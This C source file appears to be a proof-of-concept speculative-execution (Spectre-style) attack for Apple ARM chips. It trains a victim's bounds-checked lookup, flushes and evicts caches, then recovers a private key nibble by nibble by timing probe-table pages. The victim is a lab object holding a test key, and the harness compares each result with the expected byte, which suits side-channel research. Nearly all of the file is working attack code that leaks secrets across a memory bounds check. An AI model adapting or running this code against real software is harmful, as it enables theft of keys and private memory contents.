// separate_victim_fullbyte.c - separately compiled victim-object full-byte recovery.
//
// extends the page-oracle pattern to recover bytes from the victim object's
// private data. two nibble passes per byte (high + low), fresh process per
// nibble, double L2 eviction, 4000 trials per nibble.
//
// the victim holds a private key in a bounds-checked array. the attacker
// calls victim_v3_lookup_hi/lo with OOB indices. the victim's own
// __builtin_prefetch gadget speculatively warms a candidate table page
// corresponding to the secret nibble.
//
// build:
//   make separate-victim-fullbyte
#include <mach/mach_time.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "victim_fullbyte.h"

#define TRIALS    4000
#define TRAIN     30
#define PAGE      16384
#define L2        (32*1024*1024)
#define NIB       VICTIM_V3_TABLE_ENTRIES

static volatile uint64_t g_t; static volatile int g_r;
static void *tf(void *a){(void)a; pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE,0); while(g_r) g_t++; return NULL;}
static inline void bar(void){__asm__ volatile("dsb sy\n\tisb":::"memory");}
static inline uint64_t tl(volatile uint8_t *p){
    bar(); uint64_t a=g_t; bar();
    volatile uint8_t v=*p; __asm__ volatile("":: "r"(v):"memory");
    bar(); uint64_t b=g_t; return b-a;
}
static inline void cfl(void *p){__asm__ volatile("dc civac,%0"::"r"(p):"memory");}

static uint8_t *l2b, *D;
static void evict(void){
    volatile uint64_t s=0;
    for(size_t i=0;i<L2;i+=128) s^=l2b[i];
    (void)s; bar();
}

static double clock_ghz(void){
    mach_timebase_info_data_t tb; mach_timebase_info(&tb);
    uint64_t t0=mach_absolute_time(); volatile uint64_t x=0;
    __asm__ volatile("1:\n\tadd %0,%0,#1\n\tsubs %1,%1,#1\n\tb.ne 1b"
        :"+r"(x):"r"((uint64_t)5e8):);
    return 5e8/((mach_absolute_time()-t0)*tb.numer/tb.denom);
}

typedef void (*lookup_fn)(uint64_t);

static int recover_nibble(lookup_fn fn, uint8_t **table,
                          uint64_t oob_index, int expected){
    int hits[NIB]={0};
    volatile uint64_t *ba = victim_v3_get_bound_addr();

    mach_timebase_info_data_t tb_timeout; mach_timebase_info(&tb_timeout);
    uint64_t start_ns = mach_absolute_time() * tb_timeout.numer / tb_timeout.denom;
    uint64_t timeout_ns = 30ULL * 1000000000ULL;  // 30 second hard timeout

    for(int t=0; t<TRIALS; t++){
        if(t%1000==0) fprintf(stderr,"\r  trial %d/%d", t, TRIALS);
        // hard timeout: if we've been running >30s, we're probably on E-core
        uint64_t now_ns = mach_absolute_time() * tb_timeout.numer / tb_timeout.denom;
        if(now_ns - start_ns > timeout_ns){
            fprintf(stderr,"\n  TIMEOUT after %d trials\n", t);
            break;
        }
        for(int r=0; r<TRAIN; r++) fn(rand() % VICTIM_V3_PUBLIC_SIZE);
        for(int i=0;i<NIB;i++) cfl(table[i]);
        bar(); evict();
        cfl((void*)ba); bar();
        bar(); evict();
        __asm__ volatile("":: "r"(D[0]):"memory"); bar();
        fn(oob_index);
        (void)tl(D);
        int order[NIB];
        for(int i=0;i<NIB;i++) order[i]=i;
        for(int i=NIB-1;i>0;i--){int j=rand()%(i+1); int tmp=order[i]; order[i]=order[j]; order[j]=tmp;}
        int best=-1; uint64_t best_t=UINT64_MAX;
        for(int i=0;i<NIB;i++){
            int c=order[i]; uint64_t tt=tl(table[c]);
            if(tt<best_t){best_t=tt; best=c;}
        }
        uint64_t td=tl(D);
        if(best>=0 && best_t<td) hits[best]++;
    }
    fprintf(stderr,"\r                          \r");
    int top=0, sec=1;
    for(int i=1;i<NIB;i++) if(hits[i]>hits[top]){sec=top;top=i;} else if(hits[i]>hits[sec]) sec=i;
    fprintf(stderr,"    target=%x got=%x hits=%d runner=%d margin=%+d %s\n",
           expected, top, hits[top], hits[sec], hits[top]-hits[sec],
           top==expected?"OK":"MISS");
    return top;
}

int main(int argc, char **argv){
    setbuf(stdout,NULL);
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE,0);

    // --nibble=<byte_idx>:<hi|lo> mode for fresh-process-per-nibble
    int byte_idx=-1; int is_lo=-1;
    for(int a=1;a<argc;a++){
        if(strncmp(argv[a],"--nibble=",9)==0){
            char *p=argv[a]+9;
            byte_idx=atoi(p);
            char *colon=strchr(p,':');
            if(colon) is_lo=(strcmp(colon+1,"lo")==0)?1:0;
        }
    }

    double ghz=0;
    for(int attempt=0;attempt<20;attempt++){
        volatile uint64_t spin=0;
        for(uint64_t i=0;i<500000000ULL;i++) spin++;
        (void)spin;
        ghz=clock_ghz();
        if(ghz>=3.0) break;
    }
    if(ghz<3.0) return 2;

    g_r=1; pthread_t tid; pthread_create(&tid,NULL,tf,NULL);
    while(!g_t){} usleep(10000);

    l2b=mmap(NULL,L2,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    memset(l2b,1,L2);
    D=mmap(NULL,PAGE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    D[0]=0xFF;

    victim_v3_init("s3cr3t-k3y!");
    srand(0xBEEF);

    if(byte_idx>=0 && is_lo>=0){
        // single-nibble mode
        uint64_t oob = VICTIM_V3_PUBLIC_SIZE + byte_idx;
        uint8_t byte = victim_v3_get_private_byte(byte_idx);
        int expected = is_lo ? (byte & 0xf) : (byte >> 4);
        lookup_fn fn = is_lo ? victim_v3_lookup_lo : victim_v3_lookup_hi;
        uint8_t **table = is_lo ? victim_v3_table_lo : victim_v3_table_hi;
        int got = recover_nibble(fn, table, oob, expected);
        printf("NIBBLE byte=%d %s expected=%x got=%x %s\n",
               byte_idx, is_lo?"lo":"hi", expected, got,
               got==expected?"OK":"MISS");
        g_r=0; pthread_join(tid,NULL);
        return (got==expected)?0:1;
    }

    // no args: usage
    printf("usage: %s --nibble=<byte_idx>:<hi|lo>\n", argv[0]);
    printf("  or use scripts/run_separate_victim_fullbyte.sh for full key recovery\n");
    g_r=0; pthread_join(tid,NULL);
    return 0;
}
